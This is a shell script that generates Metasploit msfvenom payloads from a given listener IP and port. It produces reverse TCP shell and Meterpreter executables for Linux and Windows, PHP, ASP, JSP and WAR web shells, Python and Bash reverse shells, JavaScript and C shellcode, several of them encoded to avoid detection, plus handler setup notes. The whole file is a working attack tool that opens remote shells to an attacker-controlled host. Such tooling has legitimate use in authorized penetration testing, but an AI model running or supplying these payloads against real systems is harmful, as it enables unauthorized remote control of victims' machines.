#!/bin/sh
### Binaries Generate ###

ip=$1
port=$2

if [ $# -lt 2 ]; then
	echo "Usage: ./msfrsgen.sh [LHOST] [LPORT]"
	echo "Usage: ./msfrsgen.sh 192.168.1.100 4444"
	exit 1
else

echo "[rs$port] is reverse_tcp shell (encode if bad char)"
echo "[rse$port] is reverse_tcp shell specific encoded"
echo "[mrs$port] is meterpreter reverse_tcp"
echo "[mrse$port] is meterpreter reverse_tcp specific encoded"

#Linux x86 payload
echo "Generating Linux x86 Payload"
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$ip LPORT=$port -b '\x00\xff' --platform Linux -a x86 -f elf -o rs$port.elf
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -i 5 -b '\x00\xff' --platform Linux -a x86 -f elf -o rse$port.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b '\x00\xff' --platform Linux -a x86  -f elf -o mrs$port.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -i 5 -b '\x00\xff' --platform Linux -a x86  -f elf -o mrse$port.elf

#Windows x86
echo "Generating Windows x86 Payload"
msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -b '\x00\xff' --platform Windows -a x86  -f exe -o rs$port.exe
msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -i 5 -b '\x00\xff' --platform Windows -a x86  -f exe -o rse$port.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b '\x00\xff' --platform Windows -a x86  -f exe -o mrs$port.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -i 5 -b '\x00\xff' --platform Windows -a x86  -f exe -o mrse$port.exe

#Windows x64 - encode using cmd/powershell_x64 not compatible to x86/shikata_ga_nai -i 5
#msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.0.174 LPORT=7788 --platform windows -a x64 -e cmd/powershell_base64 -b '\x00\xff' -f exe -o bla64.exe

#MacOS
#msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.11.0.174 LPORT=7788 -e x86/shikata_ga_nai -i 5 -b '\x00\xff' -f macho -o bla.macho

### Web Payload Generate ###
#PHP
echo "Generating PHP Payload"
msfvenom -p php/reverse_php LHOST=$ip LPORT=$port -b '\x00\xff' --platform PHP -f raw -o rs$port.php
#cat rs$port.php | pbcopy && echo '<?php ' | tr -d '\n' > rs$port.php && pbpaste >> rs$port.php

#ASP
echo "Generating ASP Payload"
msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port --platform Windows -a x86 -f asp > rs$port.asp

#Java JSP
echo "Generating Java JSP Payload"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -b '\x00\xff' -f raw -o rs$port.jsp

#WAR
echo "Generating WAR Payload"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -b '\x00\xff' -f war -o rs$port.war

### Scripting Payload ###
#Python
echo "Generating Python Payload"
msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port --platform Unix -a cmd -b '\x00\xff' -f raw -o rs$port.py

#Bash
echo "Generating Bash Payload"
msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port --platform Unix -a cmd -b '\x00\xff' -f raw -o rs$port.sh

#Perl
echo "Generating Perl Payload"
#msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$port -b '\x00\xff' -f raw -o rs$port.pl

#Javascript
echo "Generating Javascript js_le Payload"
msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port --platform Windows -a x86 -f js_le > rsw$port.js
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$ip LPORT=$port --platform Linux -a x86  -f js_le >rsl$port.js
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port --platform Windows -a x86  -f js_le > mrsw$port.js
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port --platform Linux -a x86  -f js_le > mrsl$port.js

### Shellcode ###
echo "Generating Shellcode Payload"
msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -i 5 -b '\x00\xff' --platform windows -a x86 -f c > rsew$port.shellcode
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -i 5 -b '\x00\xff' --platform Linux -a x86  -f c > rsel$port.shellcode

### Handler ###
# msfconsole
# use exploit/multi/handler
# set PAYLOAD <payload used in msfvenom>
# LHOST <lhost>
# LPORT <lport>

fi
